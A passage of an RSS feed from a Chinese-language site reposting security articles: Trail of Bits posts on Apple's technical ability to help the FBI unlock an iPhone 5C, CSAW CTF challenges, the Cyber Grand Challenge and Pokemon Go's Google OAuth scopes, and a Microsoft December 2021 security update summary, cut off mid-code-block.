        <link>http://localhost:1313/p/%E8%8B%B9%E6%9E%9C%E6%8A%80%E6%9C%AF%E4%B8%8A%E5%8F%AF%E9%85%8D%E5%90%88fbi%E8%A7%A3%E9%94%81iphone-5c-%E5%AE%89%E5%85%A8%E4%B8%93%E5%AE%B6%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Sun, 03 Aug 2025 19:58:04 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E8%8B%B9%E6%9E%9C%E6%8A%80%E6%9C%AF%E4%B8%8A%E5%8F%AF%E9%85%8D%E5%90%88fbi%E8%A7%A3%E9%94%81iphone-5c-%E5%AE%89%E5%85%A8%E4%B8%93%E5%AE%B6%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;苹果可以配合fbi法庭命令---trail-of-bits博客&#34;&gt;苹果可以配合FBI法庭命令 - Trail of Bits博客
&lt;/h1&gt;&lt;p&gt;2016年2月17日&lt;br&gt;
作者：Dan Guido&lt;br&gt;
标签：apple, cryptography, policy&lt;/p&gt;
&lt;p&gt;联邦法官今日命令苹果配合FBI对圣贝纳迪诺枪击案凶手iPhone 5C的技术协助请求。基于对iOS平台的了解，我认为FBI的所有请求在技术上都是可行的。&lt;/p&gt;
&lt;h2 id=&#34;fbi的技术请求&#34;&gt;FBI的技术请求
&lt;/h2&gt;&lt;p&gt;调查中发现属于袭击者的iPhone 5C采用了&amp;quot;密码+硬件密钥&amp;quot;的双因素加密机制。FBI面临三个技术障碍：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;多次输错PIN会触发数据擦除&lt;/li&gt;
&lt;li&gt;必须通过物理设备手动输入PIN&lt;/li&gt;
&lt;li&gt;每次错误尝试后系统会引入延迟&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;FBI通过法庭令要求苹果：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;禁用自动擦除功能&lt;/li&gt;
&lt;li&gt;允许通过电子方式提交密码（USB/蓝牙/Wi-Fi）&lt;/li&gt;
&lt;li&gt;消除密码尝试间的人为延迟&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;安全飞地se技术解析&#34;&gt;安全飞地(SE)技术解析
&lt;/h2&gt;&lt;p&gt;搭载A7及以上处理器的设备包含独立的安全飞地协处理器：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;管理数据保护API、Apple Pay等服务的密钥访问&lt;/li&gt;
&lt;li&gt;采用&amp;quot;密码+SE内置密钥&amp;quot;的双密钥解密机制&lt;/li&gt;
&lt;li&gt;独立维护错误尝试计数器并实施延迟惩罚（最高1小时/次）&lt;/li&gt;
&lt;li&gt;通过硬件级配对防止TouchID传感器伪造&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;技术实现方案&#34;&gt;技术实现方案
&lt;/h2&gt;&lt;p&gt;对于无SE的iPhone 5C：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;单一iOS固件更新即可绕过所有软件级保护&lt;/li&gt;
&lt;li&gt;硬件支持每秒12次密码尝试（80ms/次）&lt;/li&gt;
&lt;li&gt;4位PIN可在半小时内破解，6位需要数小时&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;包含SE的设备需要：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;iOS固件更新&lt;/li&gt;
&lt;li&gt;SE固件更新
才能禁用安全限制&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;历史与现状&#34;&gt;历史与现状
&lt;/h2&gt;&lt;p&gt;iOS 8之前多数文件未加密，简单的UI绕过即可访问。现在必须通过密码猜测流程，这直接导致了当前的技术协助请求。苹果可通过以下方式控制风险：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;限定定制固件仅适用于特定设备&lt;/li&gt;
&lt;li&gt;在苹果设施内完成破解流程&lt;/li&gt;
&lt;li&gt;不向FBI提供固件镜像&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Trail of Bits深度参与CSAW网络安全竞赛：五大CTF挑战详解</title>
        <link>http://localhost:1313/p/trail-of-bits%E6%B7%B1%E5%BA%A6%E5%8F%82%E4%B8%8Ecsaw%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E4%BA%94%E5%A4%A7ctf%E6%8C%91%E6%88%98%E8%AF%A6%E8%A7%A3/</link>
        <pubDate>Sun, 03 Aug 2025 19:41:40 +0800</pubDate>
        
        <guid>http://localhost:1313/p/trail-of-bits%E6%B7%B1%E5%BA%A6%E5%8F%82%E4%B8%8Ecsaw%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E4%BA%94%E5%A4%A7ctf%E6%8C%91%E6%88%98%E8%AF%A6%E8%A7%A3/</guid>
        <description>&lt;h3 id=&#34;我们与csaw的特殊情缘&#34;&gt;我们与CSAW的特殊情缘
&lt;/h3&gt;&lt;p&gt;在接下来的几周内，全球数万名学生和专业人士将关注六项竞赛，为他们喜爱的队伍加油助威。这就是我们长期参与的&amp;quot;网络安全意识周&amp;quot;(CSAW)——全美规模最大的学生运营网络安全赛事。无论多忙，我们始终会抽时间助力赛事成功。&lt;/p&gt;
&lt;h3 id=&#34;ctf挑战的技术贡献&#34;&gt;CTF挑战的技术贡献
&lt;/h3&gt;&lt;p&gt;今年我们为资格赛设计了五个CTF挑战：&lt;/p&gt;
&lt;h4 id=&#34;wyvern&#34;&gt;wyvern
&lt;/h4&gt;&lt;p&gt;参赛者首先获得一个经过混淆的Linux二进制文件（即crackme）。通过LLVM实现的多层次虚假谓词插入、代码扩散和基本块分割等混淆技术，使得静态逆向分析变得极其困难。参赛者必须采用动态分析方法，使用程序分析工具暴力破解flag。在此过程中，他们将学习如何通过监控指令计数变化来泄漏程序执行路径，以及使用PIN、Angr或AFL等工具。&lt;/p&gt;
&lt;h4 id=&#34;bricks-of-gold&#34;&gt;bricks of gold
&lt;/h4&gt;&lt;p&gt;这个挑战始于一个国际谜题：&amp;ldquo;我们截获了一份走私入境的加密文件，只知道他们使用了自定义的CBC模式算法——很可能很糟糕。&amp;ldquo;参赛者需要成功解密这个自定义XOR-CBC加密文件，这要求他们找出算法、密钥和初始向量。解题过程涉及文件头分析、密码学知识和暴力破解技术，同时学习如何检测加密文件的低熵特征、未加密字符串和CBC模式块特征。&lt;/p&gt;
&lt;h4 id=&#34;sharpturn&#34;&gt;sharpturn
&lt;/h4&gt;&lt;p&gt;参赛者获得一个损坏的Git仓库存档，需要修复损坏并读取文件。实际上存在三处损坏：每处都是单个比特错误且都位于源代码文件中（这是Trail of Bits真实遇到过的情况）。修复后，源代码文件可编译成包含答案的二进制文件。参赛者将学习Git blob包含带头部信息和zlib压缩的仓库文件版本，以及如何利用Git版本控制信息重建损坏的提交。&lt;/p&gt;
&lt;h4 id=&#34;punchout&#34;&gt;punchout
&lt;/h4&gt;&lt;p&gt;题目提供三个来自IBM System/360穿孔卡的二进制数据块及其加密数据。这些卡片使用1965年的加密技术，要求参赛者研究当时的安全机制。他们会遇到KW-26等密码（生成长比特流并与明文进行XOR运算），以及IBM使用的ebcdic（非ascii）编码方式。由于相同比特流被用于加密每个数据块，这种密钥重用存在已知攻击方式，参赛者需要通过&amp;quot;crib dragging&amp;quot;技术实施攻击。&lt;/p&gt;
&lt;h4 id=&#34;math-aside-were-all-blackhats-now&#34;&gt;&amp;ldquo;math aside, we&amp;rsquo;re all blackhats now&amp;rdquo;
&lt;/h4&gt;&lt;p&gt;参赛者需要找出为电视剧《硅谷》提供咨询的安全行业专家。该剧前两季中出现了大量与CTF社区相关的道具、名称和引用，其安全相关情节的准确性令人惊讶。&lt;/p&gt;
&lt;h3 id=&#34;其他技术相关内容&#34;&gt;其他技术相关内容
&lt;/h3&gt;&lt;h4 id=&#34;政策竞赛设计&#34;&gt;政策竞赛设计
&lt;/h4&gt;&lt;p&gt;我们协助CSAW设计了政策竞赛环节，挑战学生探索美国政府实施漏洞赏金计划的可行性方案。参赛作品由该争议性话题各方的专家小组评审，前五名团队将在CSAW现场展示提案。&lt;/p&gt;
&lt;h4 id=&#34;技术传承&#34;&gt;技术传承
&lt;/h4&gt;&lt;p&gt;我们有多名员工曾作为学生参加CSAW比赛，包括通过CSAW女性夏季项目结识的实习生Loren。今年共有1,367支队伍获得积分，创下赛事新纪录。所有历史CTF挑战题均已开源在Github。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>我们在网络大挑战中的表现 - 自动化漏洞挖掘与修复的技术实践</title>
        <link>http://localhost:1313/p/%E6%88%91%E4%BB%AC%E5%9C%A8%E7%BD%91%E7%BB%9C%E5%A4%A7%E6%8C%91%E6%88%98%E4%B8%AD%E7%9A%84%E8%A1%A8%E7%8E%B0-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E4%BF%AE%E5%A4%8D%E7%9A%84%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%B7%B5/</link>
        <pubDate>Sun, 03 Aug 2025 19:30:29 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%88%91%E4%BB%AC%E5%9C%A8%E7%BD%91%E7%BB%9C%E5%A4%A7%E6%8C%91%E6%88%98%E4%B8%AD%E7%9A%84%E8%A1%A8%E7%8E%B0-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E4%BF%AE%E5%A4%8D%E7%9A%84%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%B7%B5/</guid>
        <description>&lt;h1 id=&#34;我们在网络大挑战中的表现&#34;&gt;我们在网络大挑战中的表现
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Artem Dinaburg&lt;/strong&gt;&lt;br&gt;
2015年7月15日&lt;/p&gt;
&lt;p&gt;网络大挑战资格赛于6月3日东部时间中午准时开始。那一刻，我们的网络推理系统(CRS)收到了131个特制的不安全程序。在接下来的24小时里，我们的系统成功识别了其中65个程序的漏洞，并重写了94个程序以消除代码中的缺陷。这无疑证明，将优秀软件审计师的工作自动化不仅是可能的，而且是可以实现的。&lt;/p&gt;
&lt;p&gt;尽管我们的CRS在发现和修补漏洞方面取得了成功，但最终未能晋级明年的决赛。一个致命缺陷使我们的总分降至第9名，低于晋级所需的第7名门槛。本文将详细解析我们的CRS工作原理、与其他系统的对抗表现、导致失分的原因以及后续计划。&lt;/p&gt;
&lt;h2 id=&#34;网络大挑战背景&#34;&gt;网络大挑战背景
&lt;/h2&gt;&lt;p&gt;网络大挑战(CGC)的目标是将自动化的速度和规模与人类专家的推理能力相结合。各参赛团队需要创建能自主分析任意网络程序、证明漏洞存在并自动制定有效防御措施的CRS系统。通过锦标赛形式的对抗来评估这些系统的效能。&lt;/p&gt;
&lt;p&gt;比赛分为资格赛和决赛两个阶段。资格赛于2015年6月3日举行，决赛定于2016年8月进行。只有资格赛前7名的队伍能晋级决赛。&lt;/p&gt;
&lt;p&gt;资格赛中，每个参赛队伍获得相同的131个挑战程序（特制含漏洞程序），每个程序至少包含一个故意植入的漏洞。在24小时内，各CRS系统相互对抗，根据四个标准评分：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;CRS必须无需人工干预运行，违规者取消资格&lt;/li&gt;
&lt;li&gt;CRS必须修补程序漏洞，成功修补每个漏洞获得积分&lt;/li&gt;
&lt;li&gt;CRS能证明漏洞存在时，修补得分翻倍&lt;/li&gt;
&lt;li&gt;修补后的程序需保持原有功能和性能，否则扣分&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;系统架构&#34;&gt;系统架构
&lt;/h2&gt;&lt;h3 id=&#34;准备工作&#34;&gt;准备工作
&lt;/h3&gt;&lt;p&gt;作为分布式办公的小型公司，我们选择亚马逊EC2云计算平台。出于谨慎考虑，我们在三个EC2区域部署了三个CRS实例（分别命名为Biggie、Tupac和Dre）。实际比赛中我们过度配置了约17倍的资源（使用297个c4.8xlarge实例而非必需的17个）。&lt;/p&gt;
&lt;h3 id=&#34;漏洞发现&#34;&gt;漏洞发现
&lt;/h3&gt;&lt;p&gt;我们的CRS采用多层次漏洞发现策略（图2）：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;模糊测试&lt;/strong&gt;：使用自定义动态二进制翻译器(DBT)，可在单一64位地址空间运行多个32位挑战程序&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;双重符号执行引擎&lt;/strong&gt;：一个针对原始二进制，另一个作用于mcsema转换后的LLVM代码&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;MinSet系统&lt;/strong&gt;：通过分支覆盖率维护最小最大覆盖输入集，协调模糊测试与符号执行的反馈循环&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;该系统表现优异，在已证漏洞数量上排名第二（图1）。大多数崩溃路径呈现为：网络捕获→模糊测试→符号执行→模糊测试→崩溃。&lt;/p&gt;
&lt;h3 id=&#34;补丁生成&#34;&gt;补丁生成
&lt;/h3&gt;&lt;p&gt;通过mcsema将挑战程序转换为LLVM字节码后，我们开发了两种补丁策略：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;通用补丁&lt;/strong&gt;：采用排除法，先假设所有内存访问都需验证，再排除可证明安全的访问&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;针对性补丁&lt;/strong&gt;：采用包含法，仅验证已发现漏洞的相关内存访问&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;最终我们选择了更全面的通用补丁策略，在补丁有效性（安全评分）上排名第四（图3）。&lt;/p&gt;
&lt;h2 id=&#34;功能与性能&#34;&gt;功能与性能
&lt;/h2&gt;&lt;h3 id=&#34;功能完整性&#34;&gt;功能完整性
&lt;/h3&gt;&lt;p&gt;在成功修补的94个挑战中，56个保持完整功能，30个部分功能，8个完全失效。在功能完整性方面我们位列前十名中的第五（图4），问题可能源于mcsema转换过程。&lt;/p&gt;
&lt;h3 id=&#34;性能表现&#34;&gt;性能表现
&lt;/h3&gt;&lt;p&gt;性能问题成为我们的致命伤（图5）。技术原因在于LLVM字节码转换过程，操作原因则是我们优化了错误的性能指标（内存而非CPU）。自测显示最差补丁方法的CPU中值开销为33%，而官方测量结果高达76%，这导致我们的实际得分（21.36）远低于自测预估（106）。&lt;/p&gt;
&lt;h2 id=&#34;未来计划&#34;&gt;未来计划
&lt;/h2&gt;&lt;p&gt;我们正寻求与决赛队伍合作，将其技术优势与我们强大的漏洞发现能力相结合。若未能达成合作，将专注于将CRS技术应用于真实软件的自动化漏洞修复。我们还将回馈开源社区，贡献在开发过程中对各类开源项目的改进。&lt;/p&gt;
&lt;p&gt;（全文完）&lt;/p&gt;
</description>
        </item>
        <item>
        <title>揭秘Pokemon Go过度获取Google账户权限的技术内幕</title>
        <link>http://localhost:1313/p/%E6%8F%AD%E7%A7%98pokemon-go%E8%BF%87%E5%BA%A6%E8%8E%B7%E5%8F%96google%E8%B4%A6%E6%88%B7%E6%9D%83%E9%99%90%E7%9A%84%E6%8A%80%E6%9C%AF%E5%86%85%E5%B9%95/</link>
        <pubDate>Sun, 03 Aug 2025 19:24:40 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%8F%AD%E7%A7%98pokemon-go%E8%BF%87%E5%BA%A6%E8%8E%B7%E5%8F%96google%E8%B4%A6%E6%88%B7%E6%9D%83%E9%99%90%E7%9A%84%E6%8A%80%E6%9C%AF%E5%86%85%E5%B9%95/</guid>
        <description>&lt;h1 id=&#34;为何今天我没抓到任何精灵---trail-of-bits技术调查&#34;&gt;为何今天我没抓到任何精灵 - Trail of Bits技术调查
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Dan Guido&lt;/strong&gt;&lt;br&gt;
2016年7月11日&lt;br&gt;
apple, authentication, privacy&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;tl;dr&lt;/strong&gt; 当全网疯狂时，我们展开了技术调查。以下是关于Pokemon Go申请Google账户权限的技术笔记。&lt;/p&gt;
&lt;h2 id=&#34;调查过程&#34;&gt;调查过程
&lt;/h2&gt;&lt;p&gt;今天下午6点左右，我和Jay展开了以下技术工作：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;确认Pokemon Go实际请求的权限&lt;/li&gt;
&lt;li&gt;研究这些权限的真实功能&lt;/li&gt;
&lt;li&gt;在测试应用中复现权限获取&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;逆向工程分析&#34;&gt;逆向工程分析
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;openid
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;email
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://www.google.com/accounts/OAuthLogin
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://www.googleapis.com/auth/userinfo.email
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;其中&lt;code&gt;OAuthLogin&lt;/code&gt;scope异常突出，该权限通常仅限Google自家应用（如Chrome和iOS账户管理器）使用。我们在Github上仅发现少数项目使用它。&lt;/p&gt;
&lt;h3 id=&#34;oauth技术验证&#34;&gt;OAuth技术验证
&lt;/h3&gt;&lt;p&gt;通过Google官方OAuth Playground测试时，该scope会返回&amp;quot;未授权&amp;quot;错误，说明Playground无法复现Pokemon Go的权限请求。这可能是Google 2012年弃用、2015年关闭的OAuth 1.0 API残留。但令人困惑的是，已迁移到OAuth 2.0的账户按理不应再能使用旧版API。&lt;/p&gt;
&lt;h2 id=&#34;安全缺陷分析&#34;&gt;安全缺陷分析
&lt;/h2&gt;&lt;p&gt;Pokemon Go登录流程存在三大问题：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;未明确告知请求的权限内容&lt;/li&gt;
&lt;li&gt;用户撤销权限后会自动重新启用&lt;/li&gt;
&lt;li&gt;现有文档未充分说明令牌权限含义&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;虽然Niantic声称只需要基础资料，但通过&lt;code&gt;UberAuth&lt;/code&gt;令牌可升级获取包括Gmail在内的全账户访问权限（详见&lt;a class=&#34;link&#34; href=&#34;https://gist.github.com/arirubinstein/fd5453537436a8757266f908c3e41538&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;技术细节&lt;/a&gt;）。&lt;/p&gt;
&lt;h2 id=&#34;厂商响应与解决方案&#34;&gt;厂商响应与解决方案
&lt;/h2&gt;&lt;p&gt;Niantic最终承认错误并发布声明：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;iOS版Pokemon GO错误地请求了Google账户的完全访问权限&amp;hellip;实际上仅访问基本资料信息&amp;hellip;正在通过客户端更新修正权限请求&amp;rdquo;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Google将采取两项措施：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;对已发放的令牌进行降权&lt;/li&gt;
&lt;li&gt;阻止新用户授予过度权限&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;建议用户&lt;/strong&gt;：立即在Google安全设置中撤销Pokemon Go权限，登出后重新登录以获取修正后的权限。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;em&gt;更新记录&lt;/em&gt;&lt;br&gt;
2016/7/12：确认&amp;quot;UberAuth&amp;quot;令牌可通过未公开方法升级获取全账户权限&lt;br&gt;
2016/7/13：应用已更新为仅请求基础权限&lt;/p&gt;
</description>
        </item>
        <item>
        <title>微软2021年12月安全更新全面解析：关键漏洞修复与技术指南</title>
        <link>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF2021%E5%B9%B412%E6%9C%88%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E5%85%A8%E9%9D%A2%E8%A7%A3%E6%9E%90%E5%85%B3%E9%94%AE%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E4%B8%8E%E6%8A%80%E6%9C%AF%E6%8C%87%E5%8D%97/</link>
        <pubDate>Sun, 03 Aug 2025 19:19:00 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF2021%E5%B9%B412%E6%9C%88%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E5%85%A8%E9%9D%A2%E8%A7%A3%E6%9E%90%E5%85%B3%E9%94%AE%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E4%B8%8E%E6%8A%80%E6%9C%AF%E6%8C%87%E5%8D%97/</guid>
        <description>&lt;h2 id=&#34;关键安全更新通告&#34;&gt;关键安全更新通告
&lt;/h2&gt;&lt;p&gt;2021年12月14日（美国时间），微软发布了针对多款产品的安全更新，重点修复以下高危漏洞：&lt;/p&gt;
&lt;h3 id=&#34;紧急漏洞修复&#34;&gt;紧急漏洞修复
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;CVE-2021-43890 Windows AppX Installer欺骗漏洞&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;已发现被Emotet、Trickbot等恶意软件主动利用&lt;/li&gt;
&lt;li&gt;攻击者通过钓鱼邮件诱导用户打开特制附件&lt;/li&gt;
&lt;li&gt;需立即更新Windows AppX Installer组件&lt;/li&gt;
&lt;li&gt;临时缓解措施详见CVE详情页&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;CVE-2021-43217 EFS加密文件系统远程代码执行漏洞&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;新增数据包级隐私保护机制&lt;/li&gt;
&lt;li&gt;部署顺序要求：
&lt;ul&gt;
&lt;li&gt;先更新客户端再更新服务器&lt;/li&gt;
&lt;li&gt;反向更新会导致EFS连接错误&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;提供临时注册表键&lt;code&gt;AllowAllCliAuth&lt;/code&gt;：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-reg&#34; data-lang=&#34;reg&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;HKEY_LOCAL_MACHINE&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;\SYSTEM\CurrentControlSet\Services\EFS]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;&amp;#34;AllowAllCliAuth&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;dword&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;00000001&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;强制时间表：
&lt;ul&gt;
&lt;li&gt;2022年3月8日后更新将永久启用隐私保护&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;受影响产品清单&#34;&gt;受影响产品清单
&lt;/h2&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;产品类别&lt;/th&gt;
          &lt;th&gt;最高严重等级&lt;/th&gt;
          &lt;th&gt;主要影响&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Windows 11&lt;/td&gt;
          &lt;td&gt;紧急&lt;/td&gt;
          &lt;td&gt;远程代码执行&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Windows Server 2022&lt;/td&gt;
          &lt;td&gt;紧急&lt;/td&gt;
          &lt;td&gt;远程代码执行&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Microsoft Office&lt;/td&gt;
          &lt;td&gt;紧急&lt;/td&gt;
          &lt;td&gt;远程代码执行&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;ASP.NET Core&lt;/td&gt;
          &lt;td&gt;重要&lt;/td&gt;
          &lt;td&gt;权限提升&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;技术部署指南&#34;&gt;技术部署指南
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Active Directory强化更新&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;包含4项安全增强&lt;/li&gt;
&lt;li&gt;默认未启用需手动配置&lt;/li&gt;
&lt;li&gt;未来更新将强制启用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;EFS系统更新策略&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;graph TD
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  A[客户端更新] --&amp;gt; B[服务器更新]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  C[紧急情况] --&amp;gt; D[设置AllowAllCliAuth]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  D --&amp;gt; E[客户端更新后移除注册表键]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;历史漏洞更新&#34;&gt;历史漏洞更新
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;CVE-2019-0887：扩展影响Windows 11/Server 2022&lt;/li&gt;
&lt;li&gt;CVE-2021-1669：新增iOS/Mac远程桌面客户端修复&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;后续计划&#34;&gt;后续计划
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;下次更新：2022年1月12日（日本时间）&lt;/li&gt;
&lt;li&gt;API用户可通过安全更新指南获取定制报告：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
